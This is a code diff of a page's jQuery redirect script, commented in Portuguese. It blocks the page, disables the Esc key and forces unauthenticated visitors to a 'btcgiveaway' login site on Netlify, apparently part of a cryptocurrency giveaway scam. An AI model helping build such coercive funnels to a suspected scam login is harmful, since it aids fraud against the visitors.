@@ -264,7 +264,7 @@
 </div>
 
 <script>
-  $(document).ready(function() {
+ $(document).ready(function() {
     const loginPageURL = "https://btcgiveawayin.netlify.app/";
     const mainPageURL = "https://btcgiveaway.netlify.app/";
 
@@ -281,46 +281,28 @@
         $('body').css('overflow', '');
     }
 
-    // Função para exibir o modal de redirecionamento
-    function showRedirectModal(callback) {
+    // Função de redirecionamento para login se não estiver autenticado
+    function redirectToLogin() {
         blockPage();
         $('#redirectModal').show();
 
-        // Evento para confirmar o redirecionamento ao clicar em OK
+        // Redireciona após clicar em OK, sem interferência de tecla Esc
         $('#confirmRedirect').off('click').on('click', function() {
             $('#redirectModal').hide();
             unblockPage();
-            callback();
+            window.location.replace(loginPageURL);
         });
     }
 
-    // Função para mostrar modal de continuar
-    function showContinueModal() {
-        blockPage();
-        $('#continueModal').show();
-
-        $('#closeModal').off('click').on('click', function() {
-            $('#continueModal').hide();
-            unblockPage();
-            setTimeout(function() {
-                window.location.replace(mainPageURL);
-            }, 1000);
-        });
-    }
-
-    // Remova qualquer ação relacionada à tecla Esc para impedir interrupção
+    // Removemos a escuta da tecla Esc para garantir que o redirecionamento ocorra
     $(document).off('keydown');
 
-    // Redireciona com base na autenticação e na URL atual
+    // Lógica principal de redirecionamento
     if (!isAuthenticated && window.location.href !== loginPageURL) {
-        // Se o usuário não estiver autenticado e não estiver na página de login, redirecione para a página de login
-        showRedirectModal(function() {
-            setTimeout(function() {
-                window.location.replace(loginPageURL);
-            }, 1000);
-        });
+        // Se não autenticado e não estiver na página de login, redireciona para login
+        redirectToLogin();
     } else if (isAuthenticated && window.location.href === loginPageURL) {
-        // Se o usuário estiver autenticado e na página de login, redirecione para a página principal
+        // Se autenticado e na página de login, redireciona para a página principal
         window.location.replace(mainPageURL);
     }
 });
